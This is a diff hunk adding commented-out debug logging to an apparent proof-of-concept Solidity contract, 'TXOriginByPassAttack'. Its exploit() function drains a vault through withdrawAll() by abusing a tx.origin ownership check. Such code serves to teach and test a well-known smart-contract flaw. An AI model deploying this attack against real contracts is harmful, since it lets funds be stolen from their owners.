@@ -13,6 +13,9 @@ contract TXOriginByPassAttack {
   }
   function exploit() external {
     // This call passes because tx.origin == owner
+    // console.log("Attacker tx.origin:", tx.origin);
+    // console.log("Attacker msg.sender:", msg.sender);
+    // console.log("Vault owner:", vault.owner());
     vault.withdrawAll();
   }
   receive() external payable {}
